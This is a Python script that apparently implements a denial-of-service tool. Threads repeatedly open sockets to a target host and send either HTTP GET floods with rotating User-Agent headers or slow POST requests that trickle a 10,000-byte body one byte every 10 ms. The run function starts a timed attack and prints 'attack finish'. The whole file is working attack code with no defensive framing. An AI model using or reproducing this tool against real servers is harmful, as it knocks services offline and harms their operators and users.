import threading
import string
import random
import socket
import time
import os

from common import url_parser
from common import UserAgentList, AcceptList


flag = 0


def tick_count(n: int) -> None:
    global flag
    time.sleep(n)

    flag = 1


def send_get_requests(i: int, ip: str, port: int, path: str) -> None:
    global flag

    print(f'[{i + 1}] Thread-{i + 1} {os.getpid()}')
    while flag != 1:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((ip, port))

            request = 'GET ' + path + ' HTTP/1.1\r\n'
            request += 'HOST: ' + ip + '\r\n'
            request += 'Connection: keep-alive\r\n'
            request += 'Cache-Control: no-cache\r\n'
            request += 'User-Agent: ' + random.choice(UserAgentList.USER_AGENT_LIST) + '\r\n'
            request += 'Accept: ' + AcceptList.ACCEPT_LIST[0] + '\r\n'
            request += 'Accept-Encoding: gzip, deflate\r\n'
            request += 'Accept-Language: ko,en;q=0.9,en-US;q=0.8\r\n'
            request += '\r\n'

            sock.send(str.encode(request))


def send_post_requests(i: int, ip: str, port: int, path: str) -> None:
    global flag

    while flag != 1:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((ip, port))

            request = 'POST ' + path + ' HTTP/1.1\r\n'
            request += 'HOST: ' + ip + '\r\n'
            request += 'Connection: keep-alive\r\n'
            request += 'Cache-Control: no-cache\r\n'
            request += 'Content-Length: 10000\r\n'
            request += 'User-Agent: ' + random.choice(UserAgentList.USER_AGENT_LIST) + '\r\n'
            request += '\r\n'

            sock.send(str.encode(request))

            for i in range(10000):
                payload = random.choice(string.ascii_letters + string.digits)
                sock.send(payload.encode('utf-8'))
                time.sleep(0.01)


def run(url: str, method: str, t_count: int, n: int):
    ip, port, path = url_parser(url)
    print(ip, port, path)

    tick_thread = threading.Thread(target=tick_count, args=(n, ))
    tick_thread.start()

    threads = list()
    for i in range(t_count):
        if method == 'get':
            t = threading.Thread(target=send_get_requests, args=(i, ip, port, path, ))
        elif method == 'post':
            t = threading.Thread(target=send_post_requests, args=(i, ip, port, path, ))

        threads.append(t)
        t.start()

    for thread in threads:
        thread.join()

    print(f'{ip}:{port} attack finish')
